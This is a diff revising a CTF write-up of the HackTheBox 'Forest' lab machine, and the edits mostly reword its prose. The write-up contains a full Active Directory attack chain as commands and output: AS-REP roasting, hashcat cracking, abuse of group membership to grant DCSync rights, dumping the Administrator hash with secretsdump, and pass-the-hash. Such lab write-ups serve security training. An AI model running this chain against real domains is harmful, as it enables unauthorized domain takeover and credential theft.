@@ -63,7 +63,7 @@ santi
 
 ## Exploitation
 
-I used the `users.txt` list to exploit accounts with the "`Do Not Require Kebreros Pre-Authentication`" user attribute enabled, allowing for an `AS-REP` attack and retrieve their encrypted password. Doing this, I acquired `svc-alfresco`'s password hash
+Testing the user list for AS-REP roasting revealed accounts with "Do Not Require Kerberos Pre-Authentication" enabled...
 ```bash
 nxc ldap 'FOREST' -u files/users.txt  -p '' -d 'htb.local' --asreproast files/roast.txt     
 
@@ -71,7 +71,7 @@ nxc ldap 'FOREST' -u files/users.txt  -p '' -d 'htb.local' --asreproast files/ro
 LDAP        10.10.10.161    389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:d92213ff872a80624a412d802a52b446$...
 ```
 
-Offline cracking of the captured AS-REP hash yielded the clear-text password `s3rvice`.
+The AS-REP hash cracked with `hashcat`, revealing the password `s3rvice`.
 ```bash
 hashcat -m 18200 -a 0 files/roast.txt /usr/share/wordlists/rockyou.txt
 
@@ -80,7 +80,7 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:b73c81fb8c33164c016884a6be75e669$2beb8c478e
 ...
 ```
 
-Credential validation confirmed `WinRM` access was available on port `5985`.
+The credentials worked for WinRM access on port `5985`.
 ```bash
 nxc winrm 'FOREST' -u 'svc-alfresco' -p 's3rvice' -d 'htb.local'
 
@@ -130,7 +130,7 @@ sudo ./bloodhound-cli containers start
 [+] Running `docker` to restart containers with docker-compose.yml...
 ```
 
-Imported the SharpHound data `20250614160957_loot.zip` and run a Custom Cypher Query to view the shortest path from owned principles to tier 0:
+Imported the SharpHound data `20250614160957_loot.zip` and run a Custom Cypher Query to view the shortest path from owned principles (`svc-alfesco`) to domain Tier 0:
 ```
 MATCH p = allShortestPaths((u:User)-[:AbuseTGTDelegation|AllowedToDelegate|HasSIDHistory|ADCSESC1|CanPSRemote|HasSession|ADCSESC10a|CanRDP|MemberOf|ADCSESC10b|CoerceAndRelayNTLMToADCS|Owns|ADCSESC13|CoerceAndRelayNTLMToLDAP|OwnsLimitedRights|ADCSESC3|CoerceAndRelayNTLMToLDAPS|ReadGMSAPassword|ADCSESC4|CoerceAndRelayNTLMToSMB|ReadLAPSPassword|ADCSESC6a|CoerceToTGT|SameForestTrust|ADCSESC6b|Contains|SpoofSIDHistory|ADCSESC9a|DCFor|SQLAdmin|ADCSESC9b|DCSync|SyncedToEntraUser|AddAllowedToAct|DumpSMSAPassword|SyncLAPSPassword|AddKeyCredentialLink|ExecuteDCOM|WriteAccountRestrictions|AddMember|ForceChangePassword|WriteDacl|AddSelf|GPLink|WriteGPLink|AdminTo|GenericAll|WriteOwner|AllExtendedRights|GenericWrite|WriteOwnerLimitedRights|AllowedToAct|GoldenCert|WriteSPN*1..]->(b:Base))
 WHERE "owned" IN split(u.system_tags, " ")
@@ -139,21 +139,21 @@ RETURN p
 LIMIT 1000
 ``` 
 
-Analysis revealed `svc-alfresco`'s membership in `Account Operators`, which grants permission to create users and modify group memberships for non-protected groups. This membership enabled adding users to `Exchange Windows Permissions`, which maintains `WriteDACL` privileges over the domain root - a configuration necessary for Exchange functionality but exploitable for privilege escalation.
+Bloodhound revealed that `svc-alfresco` was a part of the "Account Operators" group. This group can create users and add them to most groups, including "Exchange Windows Permissions". That group has `WriteDACL` permissions on the domain - normally needed for Exchange to work, but it creates a path to DCSync..
 ![[Pasted image 20250615014133.png]]
-To perform the DCSync attack, I firstly created a new credential object and domain user account called "wither"
+To perform the DCSync attack, I firstly created a new credential object and domain user account called "`wither`".
 ```powershell
 $SecPass = ConvertTo-SecureString 'password' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\\wither', $SecPass)
 New-ADUser -Name "wither" -SamAccountName "wither" -AccountPassword $SecPass -Enabled $true
 ```
 
-Then added it to the "Exchange Windows Permissions" group.
+The "Account Operators" membership of `svc-alfresco` allowed me to add `wither` to the "Exchange Windows Permissions" group.
 ```powershell
 Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members wither
 ```
 
-So I could then give it DCSync permissions. 
+This provided the `WriteDACL` privileges I needed to grant it DCSync rights.
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -PrincipalIdentity wither -Rights DCSync -TargetIdentity "DC=htb,DC=local" -Credential $Cred -Verbose
 
@@ -164,7 +164,7 @@ Verbose: [Add-DomainObjectAcl] Granting principal CN=wither,CN=Users,DC=htb,DC=l
 >[!info] Important to note, `-Credential` using `wither`'s credential object was vital here for the attack to work, as I needed `Add-DomainObjectAcl` to run under the context of that account (as it was a member of "Exchange Windows Permissions" and thus had permission to modify ACLs) and not `svc-alfresco`.
 
 
-And therefore to request the `Administrator`'s password hash from the DC.
+DCSync requested the `Administrator`'s password hash via domain replication through `secretsdump`.
 ```bash
 wither@kali:~/CTF/HTB/Forest/files$ secretsdump.py 'HTB'/'wither':'password'@'FOREST' 
 
@@ -176,7 +176,7 @@ htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d
 [*] Cleaning up...
 ```
 
-Which I could then "Pass" in `evil-winrm` to get a shell.
+Pass-the-hash with this NTLM hash provided access to the `Administrator` account.
 ```bash
 evil-winrm -i 'FOREST' -u 'htb.local\Administrator' -H 32693b11e6aa90eb43d32c72a07ceea6
 
@@ -196,11 +196,5 @@ And get the root flag in the `Administrator`'s Desktop.
 - [HackTricks/windows-hardening/active-directory-methodology/dcsync.md at master · b4rdia/HackTricks · GitHub](https://github.com/b4rdia/HackTricks/blob/master/windows-hardening/active-directory-methodology/dcsync.md)
 - [AD Series \| DC Sync Attacks. DCSync Attack is a type of “credential… \| by Urshila Ravindran \| Medium](https://medium.com/@urshilaravindran/ad-series-dc-sync-attacks-e76bb54308f5)
 
-
- ![[Pasted image 20250615015812.png]]
-
-
-
-
 ---
-#forest #htb #easy #windows #netexec #asreproast #hashcat #evil-winrm #bloodhound #sharphound #dcsync #pass-the-hash
+#forest #htb #easy #windows #netexec #asreproast #hashcat #evil-winrm #bloodhound #sharphound #dcsync #secretsdump #pass-the-hash
